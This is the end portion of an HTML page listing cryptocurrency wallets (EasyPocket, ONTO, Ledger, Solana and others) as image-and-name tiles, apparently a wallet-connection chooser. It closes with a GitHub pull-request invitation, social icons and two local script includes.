                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">EasyPocket</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/21.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">ONTO</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/22.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Bridge Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/23.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">SparkPoint</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/24.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">ViaWallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/25.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Coin98</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/26.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">BitKeep</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/27.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Vision</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/28.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">SWFT Wallet</h5>
            </div>          
          <!--  -->
         
         
         
         
         
         
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/29.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">PeakDeFi Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/30.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">XDC Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/31.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Unstoppable Wallet</h5>
            </div>          
          <!--  -->


          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/32.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MEET.ONE</h5>
            </div>          
          <!--  -->
          
          
          
          
          
          
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/33.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Dok Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/34.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">AT.Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/35.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MoriX Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/36.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Midas Wallet</h5>
            </div>          
          <!--  --> 


          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/38.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ledger</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/39.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Harmony</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/40.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Binance Smart Chain</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/41.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Polkadot</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/42.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Solana</h5>
            </div>          
          <!--  -->

        </section>
      </section>

      <!-- Section 3 -->
      <section>
        <section class="center section-4">
          <p class="para-2">
            Open a pull request on <a href="#" class="link-2">Github</a> to add
            your wallet here.
          </p>
          <div class="footers m-t-70px">
            <div class="footers-item">
              <i class="fab fa-discord tt"></i>
              <span>Discord</span>
            </div>

            <div class="footers-item">
              <i class="fab fa-telegram-plane tt"></i>
              <span>Telegram</span>
            </div>

            <div class="footers-item">
              <i class="fab fa-twitter tt"></i>
              <span>Twitter</span>
            </div>

            <div class="footers-item">
              <i class="fab fa-github tt"></i>
              <span>Github</span>
            </div>
          </div>
        </section>
      </section>
    </section>

    <script src="./js/jQuery.min.js"></script>
    <script src="./js/main.js"></script>
  </body>
</html>
